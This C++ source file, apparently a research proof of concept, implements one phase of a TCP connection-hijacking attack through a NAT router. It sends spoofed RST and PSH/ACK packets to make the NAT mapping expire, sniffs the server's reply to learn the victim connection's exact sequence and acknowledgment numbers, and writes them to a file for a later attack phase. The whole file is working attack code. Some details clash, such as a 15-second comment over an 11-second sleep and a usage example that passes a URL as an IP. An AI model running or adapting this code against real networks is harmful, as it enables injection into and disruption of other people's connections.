#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <time.h>
#include <set>
#include <map>
#include <thread>
#include <tins/tins.h>
#include <fstream>
using namespace std;
using namespace Tins;

IPv4Address remote_server_ip, attacker_private_ip, router_wan_ip;
uint16_t remote_server_port;
uint16_t guessed_client_port;
uint32_t exact_seq, exact_ack;
bool seq_got = false;
string packet_iface;
string sniff_filter;

bool debug = true;

double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}


// Save the seq and ack to file for the third phase to use.
void save_seq_ack_to_file() {
    ofstream fout; 
	fout.open("../complete_attack/SEQ_ACK_RESULT"); 
	fout << "seq: " << exact_seq << endl;
	fout << "ack: " << exact_ack << endl;
	fout.close();
    return;
}

// In this thread, we will get the sequence and acknowledgment numbers of the victim connection.
void get_seq_ack() {
    PacketSender sender;
    NetworkInterface iface(packet_iface); 
	struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    while (true){
        IP rst_pkt = IP(router_wan_ip, remote_server_ip) / TCP(guessed_client_port, remote_server_port);
        rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
        rst_pkt.rfind_pdu<TCP>().seq(1);
        sender.send(rst_pkt, iface);
        if(debug) 
            cout << "send rst, will sleep for 15 seconds until the NAT mapping expires." << endl;
        sleep(11);

        // second, send a data packet to the outside server with my own IP address.
        IP pa_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
        pa_pkt.rfind_pdu<TCP>().set_flag(TCP::PSH, 1);
        pa_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        pa_pkt.rfind_pdu<TCP>().seq(1);
        sender.send(pa_pkt, iface);
        if(debug) 
            cout << "PA packet sent, wait for the ACK back" << endl;
        // third, wait for the outside server to send the ACK packet with the exact SEQ and ACK back.
        // if you do not receive the ACK packet, you need to debug to find what happened.
        // maybe should check the RST TTL, or its sequence number.
        sleep(2);
        if (!seq_got) {
            cout << "Something wrong! You need to debug the code" << endl;
            IP rst_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
            rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
            rst_pkt.rfind_pdu<TCP>().seq(2);
            sender.send(rst_pkt, iface);
        } else {
            if(debug) 
                cout << "Received exact SEQ: " << exact_seq << ", Received exact ACK: " << exact_ack << endl;
            save_seq_ack_to_file();
            gettimeofday(&stop_time, NULL);
            if(debug) 
                cout << "Get seq and ack time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;   
            break;
        }
    }
}


// sniff to receive the ACK packet and extract the seq and ack of the ACK.
bool callback(const PDU &pdu) {
    const IP &ip = pdu.rfind_pdu<IP>(); 
    const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	if (ip.protocol() == 6 && ip.src_addr() == remote_server_ip) {
        if (tcp.sport() == remote_server_port && tcp.dport() == guessed_client_port && (tcp.flags() == TCP::ACK)) {
            exact_seq = tcp.seq();
            exact_ack = tcp.ack_seq();
            seq_got = true;
        }
    }
    return true;
}

void sniff_packets() {
    // Construct the sniffer configuration object
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
	config.set_immediate_mode(true);
    Sniffer(packet_iface, config).sniff_loop(callback);
}

int main(int argc, char** argv)
{
    if (argc != 7) {
        cout << "wrong number of args" << endl;
        return 0;
        //e.g., sudo ./seq_infer 10.20.189.17 40592 43.159.39.110 5904 http://43.159.39.110:5902 tun0
    }
    attacker_private_ip = IPv4Address(argv[1]);
    guessed_client_port = atoi(argv[2]);
    remote_server_ip = IPv4Address(argv[3]);
    remote_server_port = atoi(argv[4]);
    router_wan_ip = IPv4Address(argv[5]);
    packet_iface = argv[6];


    sniff_filter =  "ip src " + string(argv[3]) + " and tcp port " + string(argv[4]);

    cout << sniff_filter << endl;
    // start the sniff thread
    thread sniff_thread(sniff_packets);
    
    
    
    // start the main thread to get the SEQ and ACK numbers.
    get_seq_ack();
    sniff_thread.detach();

	return 0;
}
